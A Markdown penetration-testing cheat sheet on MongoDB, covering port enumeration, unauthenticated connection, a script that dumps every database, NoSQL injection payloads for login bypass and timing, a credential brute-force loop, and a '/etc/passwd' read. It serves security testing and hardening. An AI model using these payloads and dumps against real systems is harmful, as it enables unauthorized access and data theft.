#MongoDB #database #nosql #documentstore

## What is MongoDB?
Open-source NoSQL document database. Stores data as BSON (binary JSON) documents. No authentication enabled by default in many versions. Data organized into databases → collections → documents.

- Port: **TCP 27017** (default instance), **TCP 27018** (shard), **TCP 27019** (config server)
- Config: `/etc/mongod.conf`
- Default bind: `127.0.0.1` (v3.6+), `0.0.0.0` (older)

---

## Enumeration

```bash
# Nmap
nmap -p 27017 --script mongodb-info,mongodb-databases -sV <target>

# Check if unauthenticated
mongosh --host <target> --eval "db.adminCommand({listDatabases:1})"

# Metasploit
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/gather/mongodb_js_inject_collection_enum
```

---

## Connect / Access

```bash
# mongosh (modern client)
mongosh "mongodb://<target>:27017"
mongosh "mongodb://<user>:<pass>@<target>:27017/<database>"

# Legacy mongo client
mongo --host <target> --port 27017
mongo --host <target> -u <user> -p <pass> --authenticationDatabase admin

# Connect to specific database
mongosh "mongodb://<target>/admin"
```

---

## Key Commands

```javascript
// Show all databases
show dbs
db.adminCommand({ listDatabases: 1 })

// Switch database
use <database>

// Show collections in current db
show collections
db.getCollectionNames()

// Query all documents in collection
db.<collection>.find()
db.<collection>.find().pretty()

// Query with filter
db.<collection>.find({ "username": "admin" })
db.<collection>.findOne({ "role": "admin" })

// Count documents
db.<collection>.countDocuments()

// List users
use admin
db.system.users.find()
db.getUsers()

// Server info
db.serverStatus()
db.version()
db.hostInfo()

// List roles
db.getRoles({ showBuiltinRoles: true })
```

---

## Attack Vectors

### Unauthenticated Access

```bash
# Check for open instance
mongosh "mongodb://<target>" --eval "show dbs"

# Dump all data from all databases
mongosh "mongodb://<target>" --eval "
db.adminCommand({listDatabases:1}).databases.forEach(function(d){
  var db2 = db.getSiblingDB(d.name);
  db2.getCollectionNames().forEach(function(c){
    print('=== ' + d.name + '.' + c + ' ===');
    db2[c].find().forEach(printjson);
  });
})"
```

### NoSQL Injection (Web Apps)

```javascript
// Authentication bypass
// POST body: {"username": {"$gt": ""}, "password": {"$gt": ""}}
// URL param: ?user[$ne]=invalid&pass[$ne]=invalid

// Regex-based enumeration
{"username": {"$regex": "^a"}}

// Blind injection with timing
{"$where": "sleep(1000)"}
```

```bash
# nosqlmap
python nosqlmap.py --attack 1 --uri "http://<target>/login"

# Burp Suite — modify JSON params to use $gt, $ne, $regex operators
```

### Credential Brute Force

```bash
# Metasploit
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Manual
for pass in $(cat passwords.txt); do
  mongosh "mongodb://admin:$pass@<target>/admin" --eval "db.version()" 2>/dev/null && echo "FOUND: $pass"
done
```

### Read Files (if mongod has OS access)

```javascript
// Load local file via load() — works in mongosh shell context if accessible
load("/etc/passwd")
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `security.authorization: enabled` | Unauthenticated access to all data |
| `net.bindIp: 0.0.0.0` | Exposed to network |
| Default port open to internet | Direct enumeration and data access |
| Weak/no admin password | Full db access |
| Running as root | OS-level impact |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (no auth) | `mongosh "mongodb://host:27017"` |
| Connect (auth) | `mongosh "mongodb://user:pass@host/admin"` |
| List databases | `show dbs` |
| List collections | `show collections` |
| Dump collection | `db.collection.find().pretty()` |
| List users | `use admin; db.system.users.find()` |
| Nmap enum | `nmap -p 27017 --script mongodb-info host` |
